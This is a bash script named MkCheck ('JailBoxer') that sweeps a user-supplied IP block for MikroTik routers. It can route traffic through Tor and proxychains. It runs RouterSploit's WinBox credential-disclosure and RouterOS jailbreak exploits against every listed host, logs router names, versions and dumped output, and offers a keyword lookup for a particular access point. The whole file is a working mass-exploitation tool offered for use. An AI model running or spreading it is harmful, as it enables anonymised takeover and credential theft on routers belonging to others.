#!/bin/bash
LPATH='/opt/MkCheck/'
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'
RED='\033[0;31m'
LGRY='\033[0;37m'
INV='\e[7m'
BRED='\033[1;31m'
UPURPLE='\033[4;35m'
UBLUE='\033[4;34m'
URED='\033[4;31m'
LCYN='\033[1;36m'
Z=1

#########################################
#######################
#  Trap Control Init  #
#######################

function trap_ctrlc (){
    # perform cleanup here
    echo -e "${URED}Ctrl-C caught...${NC}"
    echo -e "${W}Would you like to exit?${YLW}(y/n)${NC}"
	read EXIT
	if [[ ${EXIT} == "y" ]]; then
		if [[ ${MODULE} == "1" ]]; then
			apresults
		fi
		exit 2
	else
		return
	fi
}

##########################################
#######################
#  Invoke trap_ctrlc  #
#######################

trap "trap_ctrlc" 2

##########################################
################################
#   Privilige and File Checks  #
################################

sudo chown $USER:$USER -R /opt/MkCheck
cd /opt/MkCheck

##########################################
####################
#    Root Check    #
####################

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi

###########################################
#######################
# Result folder check #
#######################

if [[ ! -d '/opt/MkCheck/results' ]]; then
	mkdir /opt/MkCheck/results
fi

##########################################
########################
#   RSF folder check   #
########################

if [[ ! -d '/opt/MkCheck/results/RSF' ]]; then
	mkdir /opt/MkCheck/results/RSF
fi

##########################################
########################
#   Vuln folder check  #
########################

if [[ ! -d '/opt/MkCheck/results/Vulns' ]]; then
	mkdir /opt/MkCheck/results/Vulns
fi

#########################################################
######################
# (SE) Session Edit  #
######################

edit_session(){
	echo -e "${YLW}This changs a single number set <xx.xx.132.xx>, to change multiple, just run this option again${NC}"
	echo -e "${W}Please enter the name of the session to edit${NC}"
	read SESHO
	echo -e "${W}Please enter the number to be replaced${NC}"
	read EXIT
	echo -e "${W}Please enter the number to insert${NC}"
	read ENTER
	echo -e "${W}Please enter the name for this target files session${NC}"
	read SESSION
	echo ${SESSION} >> .conf
	sed -i "s/${EXIT}/${ENTER}/g" files/.${SESHO}_tiks.txt
	cp files/.${SESHO}_tiks.txt files/.${SESSION}_tiks.txt
	cp files/.${SESSION}_tiks.txt files/tiks_res.txt
	cp files/.${SESSION}_tiks.txt files/tiks_rsf.txt

	########################################################
    ##############################
	#  RSF Session Folder Check  #
	##############################
	
	if [[ ! -d /opt/MkCheck/results/RSF/${SESSION} ]]; then
			mkdir /opt/MkCheck/results/RSF/${SESSION}
	fi
	
	####################################################
    ###############################
	#  Vuln Session Folder Check  #
	###############################
	
	if [[ ! -d /opt/MkCheck/results/Vulns/${SESSION} ]]; then
		mkdir /opt/MkCheck/results/Vulns/${SESSION}
	fi
}

##############################################################
#  Fresh Session  #
###################

fresh(){
	sudo rm files/tiks.txt files/tiks_res.txt files/tiks_rsf.txt
	echo -e "${W}Please enter a name for this session${NC}"
	read SESSION
	echo ${SESSION} >> .conf
	echo -e "${W}Please enter your target block${NC}"
	sleep 2
	nano files/tiks.txt
	echo -e "${YLW}Backup of this sessions Target file saved as ${UBLUE}.${SESSION}_tiks.txt${NC}"
	cp files/tiks.txt files/.${SESSION}_tiks.txt 
	cp files/tiks.txt files/tiks_res.txt
	cp files/tiks.txt files/tiks_rsf.txt

	########################################################
    ##############################
	#  RSF Session Folder Check  #
	##############################
	
	if [[ ! -d /opt/MkCheck/results/RSF/${SESSION} ]]; then
			mkdir /opt/MkCheck/results/RSF/${SESSION}
	fi
	
	####################################################
    ###############################
	#  Vuln Session Folder Check  #
	###############################
	
	if [[ ! -d /opt/MkCheck/results/Vulns/${SESSION} ]]; then
		mkdir /opt/MkCheck/results/Vulns/${SESSION}
	fi
}

##############################################################
########################
# (SC) Session Choice  #
########################

session_choice(){
  SESSION=$(cat .conf)
	echo -e "${W}Previous Sessions: ${LP}${SESSION}${NC}"
	echo -e "${W}Would you like to ${URED}u${NC}${W}se a previous session, edit an ${URED}e${NC}${W}xisting session or start ${URED}f${NC}${W}resh?${YLW}(u/e/f)${NC}"
	read CONF
	if [[ ${CONF} == "f" ]]; then
		fresh		
	elif [[ ${CONF} == "e" ]]; then
		edit_session
	else
		echo -e "${W}Please enter the name of the session to use:${NC}"
		read SESSION
		cp files/.${SESSION}_tiks.txt files/tiks.txt
	fi
	
					#	########################################################
					#    #############################
					#	#  RSF Session Folder Check  #
					#	##############################
					#	
					#	if [[ ! -d /opt/MkCheck/results/RSF/${SESSION} ]]; then
					#			mkdir /opt/MkCheck/results/RSF/${SESSION}
					#	fi
					#	
					#	####################################################
					#   ###############################
					#	#  Vuln Session Folder Check  #
					#	###############################
					#	
					#	if [[ ! -d /opt/MkCheck/results/Vulns/${SESSION} ]]; then
					#		mkdir /opt/MkCheck/results/Vulns/${SESSION}
					#	fi
}



#########################################################################
#######################
#    Session Check    #
#######################

if [[ ! -f '.conf' ]]; then
	# First check to see if tiks.txt has data
	RE=$(cat /opt/MkCheck/files/tiks.txt)
	if [[ ${RE} == "" ]]; then
		echo -e "${URED}Please enter an IP block to start scanning first${NC}"
		echo "# LEAVE THIS LINE IN* (FOR BEST RESULTS USE AN ENTIRE IP BLOCK)" > /opt/MkCheck/files/tiks.txt
		sudo nano /opt/MkCheck/files/tiks.txt
	fi
	
	#################################################
    #################################################
	#  Second check to see if data is example data  #
	#################################################

	RR=$(cat /opt/MkCheck/files/tiks.txt | grep "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS")
	if [[ ${RR} == "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS" ]]; then
		sudo rm /opt/MkCheck/files/tiks.txt
		echo -e "${URED}Please enter an IP block to start scanning first${NC}"
		echo "# LEAVE THIS LINE IN* (FOR BEST RESULTS USE AN ENTIRE IP BLOCK)" > /opt/MkCheck/files/tiks.txt
		nano /opt/MkCheck/files/tiks.txt
	fi
	echo -e "${W}Please enter a name for this session${NC}"
	read SESSION
	echo "${SESSION}" > .conf
	echo -e "${W}Session: ${LP}${SESSION}${NC}"
	cp files/tiks.txt files/.${SESSION}_tiks.txt
	
	##############################
	##############################
	#  RSF Session Folder Check  #
	##############################

	mkdir /opt/MkCheck/results/RSF/${SESSION}
	mkdir /opt/MkCheck/results/Vulns/${SESSION}
else
	
	####################################
	####################################
	# (SC) Check for data replacement  #
	####################################

	session_choice
fi

############################################
############################################
#  Routersploit file check (tiks.rsf.txt)  #
############################################

if [[ -f '/opt/MkCheck/files/tiks_rsf.txt' ]]; then
	RT=$(cat /opt/MkCheck/files/tiks_rsf.txt | grep "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS")
	if [[ ${RT} == "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS" ]]; then
		sudo rm /opt/MkCheck/files/tiks_rsf.txt
		cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_rsf.txt
	fi
else
	sudo cp files/tiks.txt files/tiks_rsf.txt
fi

######################################
######################################
#  Result file check (tiks_res.txt)  #
######################################

if [[ -f '/opt/MkCheck/files/tiks_res.txt' ]]; then
	RS=$(cat /opt/MkCheck/files/tiks_res.txt | grep "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS")
	if [[ ${RS} == "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS" ]]; then
		sudo rm /opt/MkCheck/files/tiks_res.txt
		cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_res.txt
	fi
else
	cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_res.txt
fi

#########################################
#########################################
#  Insert new target for MCheck Attack  #
#########################################

target(){
	RARG=$(python3 scripts/get_t.py)
	VAR=$(echo ${RARG})
	FARG='host = "ARG"'
}

####################
####################
#  Host Auto Load  #
####################

running(){
	mv files/tiks1.txt files/tiks.txt
	# Start
	TARG=$(cat scripts/miko.py | grep "host = *")
	sed -i "s/${TARG}/${FARG}/g" scripts/miko.py
	sed -i "s/ARG/${VAR}/g" scripts/miko.py
	echo -e "${UPURPLE}${Z}.${UBLUE}Next Target is ${YLW}${VAR}${NC}"
}

###############################################
###############################################
#  Final Results Correlation for Net AP Name  #
###############################################

apresults(){
	for log in `cat /opt/MkCheck/files/tiks_res.txt`
		do
			Y='1'
			Y=$(( ${Y} + 1 ))
			echo "${log}"
			echo "${log}" >> results/Vulns/${SESSION}/final.results
			cat results/Vulns/${SESSION}/${log}.results
			cat results/Vulns/${SESSION}/${log}.results >> results/Vulns/${SESSION}/final.results
			echo "==========================================================================="
			if [[ ${Y} == ${Z} ]]; then
				break
			fi
		done

		######################
		######################
		#  Targetted Lookup  #
		######################

		echo -e "${W}Was there a specific target you were looking for?${YLW}(y/n)${NC}"
		read GETTED
		if [[ ${GETTED} == "y" ]]; then
			echo -e "${W}Please specify a keyword for your target Access Point${NC}"
			echo -e "${RED}eg. ${YLW}123 Apartment${RED} <-- target access point name${NC}"
			echo -e "${RED}Keyword to search for would be ${YLW}Apartment${RED} or ${YLW}123${NC}"
			read KEY
			cat /opt/MkCheck/results/Vulns/${SESSION}/final.results | grep ${KEY}
		fi
}

###################################################3###############33
############################################
#  Mikro Network AP Name Check (No Proxy)  #
############################################

mchecker(){
	while [[ $Z -lt 255 ]];
	do
		echo -e "${RED}Press <CTRL+C> to exit.${NC}"
		target
		echo ""
		running
		echo ""
		sudo python2 scripts/miko.py | tee output.log
		NAME=$(cat output.log | grep 'name:')
		VER=$(cat output.log | grep 'RouterOS')
		echo "${NAME}" >> results/Vulns/${SESSION}/${VAR}.results
		echo "${VER}" >> results/Vulns/${SESSION}/${VAR}.results
		echo "=================================================" >> results/Vulns/${SESSION}/${VAR}.results
		sudo rm output.log
		Z=$(( $Z + 1 ))
		if [[ ${Z} -eq 255 ]]; then
			echo -e "${LP}Sorting Results${NC}"
			break
		fi
	done
	apresults
	main
}

##############################################################333########33###
#######################################
#  Network AP Discovery (with Proxy)  #
#######################################
pchecker(){
	while [[ $Z -lt 255 ]];
	do
		echo -e "${RED}Press <CTRL+C> to exit.${NC}"
		target
		echo ""
		running
		echo ""
		proxychains4 sudo python2 scripts/miko.py | tee output.log
		NAME=$(cat output.log | grep 'name:')
		VER=$(cat output.log | grep 'RouterOS')
		echo "${NAME}" >> results/Vulns/${SESSION}/${VAR}.results
		echo "${VER}" >> results/Vulns/${SESSION}/${VAR}.results
		echo "=================================================" >> results/Vulns/${SESSION}/${VAR}.results
		sudo rm output.log
		Z=$(( $Z + 1 ))
		if [[ ${Z} -eq 255 ]]; then
			echo -e "${LP}Sorting Results${NC}"
			break
		fi
	done
	apresults
	main
}

#######################################3##################################33
#############################
#  Routersploit Vuln Check  #
#############################

rtsploit(){
	cd /root/routersploit
	for name in `cat /opt/MkCheck/files/tiks_rsf.txt`
		do
			
			#########################################
			#########################################
			#  winbox_auth_bypass_creds_disclosure  #
			#########################################

			WINSAVE=$(sudo python3 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
			
			########################
			########################
			#  routeros_jailbreak  #
			########################

			JAIL=$(sudo python3 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
			echo "${JAIL}"
			echo "======================================================================" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
		done
}

######################################################
#################
#  Update Args  #
#################

up_arg(){
    echo $1 >> temp.log
    echo $2 >> temp.log
    echo $3 >> temp.log
    echo $4 >> temp.log
    echo $5 >> temp.log

    for UFILES in `cat temp.log`
       	        do
    	            rm /opt/MkCheck/${UFILES}
                done
    rm /opt/MkCheck/temp.log
}
update(){
    cd /opt/MkCheck
    echo -e "${ORNG}"
    figlet -f mini "Checking for updates"
    echo -e "${NC}"
    git fetch
    VER=$(git pull)
    if [[ ${VER} == "Already up to date." ]]; then
        echo -e "${LP}"
        figlet -f mini "Up to date."
        echo -e "${NC}"
    else
		sleep 5
	    echo -e "${W}Are there pull conflicts with files?(y/n)${NC}"
        sleep 3
	    read UANS
	    if [[ ${UANS} == "y" ]]; then
        	export LPATH
        	echo -e "${W}Please enter the conflicting files (seperated by a space)${NC}"
		    read FILES
          	sleep 2
		    up_arg ${FILES}
		    git pull
	    else
		    git pull
	    fi
	    if [[ -f '/usr/sbin/mkcheck' ]]; then
		    sudo cp mkcheck -t /usr/sbin
		    sudo chmod +x /usr/sbin/mkcheck
		fi
		main
    fi
  echo -e "${NC}"
}

##################################################################################
#######################
#  Router Cred Check  #
#######################

cred_check(){
	USER=$(cat /opt/MkCheck/scripts/miko.py | grep 'username =')
	PASS=$(cat /opt/MkCheck/scripts/miko.py | grep 'password =')
	echo -e "${YLW}Current Username Value: ${ORNG}${USER}"
	echo -e "${YLW}Current Password Value: ${ORNG}${PASS}${NC}"
}

################################################################################
###############
#  Main Menu  #
###############

main(){
	MODULE=''
	echo -e "${BRED}"
	python3 files/banner.py
	echo -e "${ORNG}Codename: ${LCYN}JailBoxer"
	echo -e "${ORNG}by ${LCYN}s1l3nt78${NC}"
	echo ""
	echo -e "${LGRY}Mikrotik WinBox Auth Bypass - ${W}Versions ${YLW}6.29${NC} ${W}to${NC} ${YLW}6.42"
    echo -e "${LGRY}Mikrotik RouterOS Jailbreak - ${W}Versions ${YLW}2.9.8${NC} ${W}to ${YLW}6.41rc56${NC}"
	echo -e "${W}Hit ${UBLUE}Ctrl + Z${NC} ${W}to background MkCheck or ${UBLUE}Ctrl + C${NC} ${W}to quit a scan${NC}"
	echo ""
	echo -e "${URED}${W}Current Session: ${ORNG}${SESSION}${NC}"
	cred_check
	echo ""
	echo -e ""
	echo -e "${RED}1. ${LGRY}MikroTik Auto-EX"
	echo -e "${RED}2. ${LGRY}RouterSploit Vuln Check"
  	echo -e "${LP}3. ${LGRY}Change Session"
  	echo -e "${LP}4. ${LGRY}Change Credential Values"
	echo -e "${LP}5. ${LGRY}Clear all previous sessions.${NC}"
	echo -e "${LCYN}6. ${LGRY}Update MkCheck"
	echo ""
	echo -e "${YLW}Which module would you like to use?${NC}"
	read MODULE
	if [[ ${MODULE} == "1" ]]; then
		echo -e "${W}Would you like to run MCheck using a proxy?${YLW}(y/n)${NC}"
		read PROXY
		if [[ ${PROXY} == "y" ]]; then
			sudo service tor restart
			pchecker
		else
			mchecker
		fi
	elif [[ ${MODULE} == "2" ]]; then
		rtsploit
	elif [[ ${MODULE} == "3" ]]; then
		session_choice
		main
	elif [[ ${MODULE} == "4" ]]; then
		nano /opt/MkCheck/scripts/miko.py
	elif [[ ${MODULE} == "5" ]]; then
		sudo rm -rf .conf results/Vulns/* files/.*_tiks.txt
		echo -e "${W}Would you like to create a ${URED}n${NC}${W}ew session or ${URED}e${NC}${W}xit?${YLW}(n/e)${NC}"
		read MOD
		if [[ ${MOD} == "n" ]]; then
			fresh
			main
		else
			exit 2
		fi
  	elif [[ ${MODULE} == "6" ]]; then
    	update
		main
	else
		echo -e "${URED}You have selected an invalid option${NC}"
	fi
	main
}

##########################################
#############################
#  Start of MkCheck Script  #
#############################

cd /opt/MkCheck
echo -e "${LP}"
figlet MkCheck
echo -e "${NC}"
main

